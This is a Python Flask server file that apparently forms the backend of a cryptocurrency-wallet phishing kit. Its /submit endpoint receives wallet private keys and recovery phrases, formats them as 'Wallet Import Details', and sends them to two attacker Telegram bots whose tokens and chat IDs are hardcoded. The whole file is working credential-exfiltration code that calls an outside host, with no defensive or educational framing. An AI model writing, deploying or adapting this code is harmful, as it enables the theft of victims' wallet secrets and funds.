from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# Telegram bot configurations
BOT1_TOKEN = '8953530727:AAFU_4-VbN9kjNpm9BnwL7s9qYfmHy6eN00'
BOT1_CHAT_ID = '5323046649'

BOT2_TOKEN = '6505854985:AAHTEl0SOUeXTe4pXaFbK7SIxN3heKLMWdU'
BOT2_CHAT_ID = '1093324452'

@app.route('/submit', methods=['POST'])
def submit_to_telegram():
    try:
        data = request.json
        
        wallet_name = data.get('wallet_name', 'Wallet')
        data_type = data.get('type', 'Unknown')
        payload = data.get('payload', '')
        
        label = 'Private Key' if data_type == 'pk' else f'{data_type}-word Recovery Phrase'
        message = f"*Wallet Import Details*\n\n*Wallet:* {wallet_name}\n*Type:* {label}\n*Data:* {payload}"
        
        # Send to both bots
        bots = [
            {'token': BOT1_TOKEN, 'chat_id': BOT1_CHAT_ID},
            {'token': BOT2_TOKEN, 'chat_id': BOT2_CHAT_ID}
        ]
        
        results = []
        for bot in bots:
            if bot['token'] == 'YOUR_BOT2_TOKEN_HERE' or bot['chat_id'] == 'YOUR_BOT2_CHAT_ID_HERE':
                continue
                
            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
            response = requests.post(url, json={
                'chat_id': bot['chat_id'],
                'text': message,
                'parse_mode': 'Markdown'
            })
            results.append(response.status_code == 200)
        
        if any(results):
            return jsonify({'success': True}), 200
        else:
            return jsonify({'success': False, 'error': 'Failed to send'}), 500
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
